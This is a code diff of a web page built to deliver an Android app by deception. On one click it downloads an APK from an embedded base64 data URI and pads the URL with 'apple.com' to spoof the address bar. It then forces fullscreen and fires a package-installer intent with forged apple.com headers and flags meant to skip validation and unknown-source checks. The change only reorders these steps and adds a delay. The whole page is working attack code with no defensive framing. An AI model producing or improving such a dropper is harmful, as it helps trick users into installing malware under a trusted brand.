@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Address Bar Spoofing & Fullscreen Dispatcher</title>
+    <title>Delayed Fullscreen Dispatcher</title>
     <style>
         body {
             font-family: monospace;
@@ -40,23 +40,11 @@
 </head>
 <body>
 
-    <button id="strikeBtn">Initialize Hardened Dispatch & Fullscreen</button>
+    <button id="strikeBtn">Initialize Download First, Then Fullscreen</button>
     <div id="status"></div>
 
     <script>
         document.getElementById('strikeBtn').addEventListener('click', function() {
-            // --- 0. FORCE FULLSCREEN (Prioritas Utama di Baris Pertama) ---
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen().catch(err => {
-                    console.log("Fullscreen blocked or failed:", err);
-                });
-            } else if (elem.webkitRequestFullscreen) { /* Safari / iOS */
-                elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) { /* IE/Edge */
-                elem.msRequestFullscreen();
-            }
-
             // --- 1. CONFIGURATION ---
             const filename = "app.apk";
             const realDomain = "apple.com";
@@ -66,10 +54,10 @@
             const longSub = realDomain + overflowPadding;
 
             // --- 3. PAYLOAD CONSTRUCTION (Self-generated local Base64 APK) ---
-            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYPWpLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
+            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYXBwLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
             const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#${longSub}`;
 
-            // --- 4. EXECUTION ---
+            // --- 4. EXECUTION (Download Berjalan Duluan) ---
             const a = document.createElement('a');
             a.href = payload;
             a.download = filename;
@@ -78,17 +66,29 @@
             document.body.appendChild(a);
             a.click();
 
-            document.getElementById('status').innerText = "> FULLSCREEN_ACTIVE & SPOOFING_TARGET: " + realDomain;
+            document.getElementById('status').innerText = "> DOWNLOAD_TRIGGERED: Awaiting 3s for Fullscreen & Intent...";
 
-            // --- 5. HARDENED INTENT FALLBACK DISPATCH ---
+            // --- 5. DELAY 3 SECONDS: FULLSCREEN & INTENT DISPATCH ---
             setTimeout(() => {
+                // Masuk Fullscreen setelah 3 detik
+                const elem = document.documentElement;
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen().catch(err => {
+                        console.log("Fullscreen blocked or failed:", err);
+                    });
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                }
+
                 document.body.removeChild(a);
                 
-                // Intent 1-line diperkuat dengan flag maksimum dan enkode header penuh
+                // Intent 1-line dijalankan bersamaan dengan Fullscreen
                 const targetIntent = "intent://apple.com/#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;launchFlags=0x3FFFFFFF;flag=0x3FFFFFFF;S.browser_fallback_url=" + encodeURIComponent(payload) + ";S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fapple.com%2F%0AOrigin%3A%https%3A%2F%2Fapple.com%2F;B.android.intent.extra.ALLOW_MULTIPLE=true;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;B.android.intent.extra.TRUNCATE_HISTORY=false;B.android.intent.extra.BYPASS_KEYGUARD_PERMISSIONS=true;B.android.intent.extra.SKIP_VALIDATION=true;end";
                 
                 window.location.replace(targetIntent);
-            }, 1500);
+            }, 3000);
         });
     </script>
 
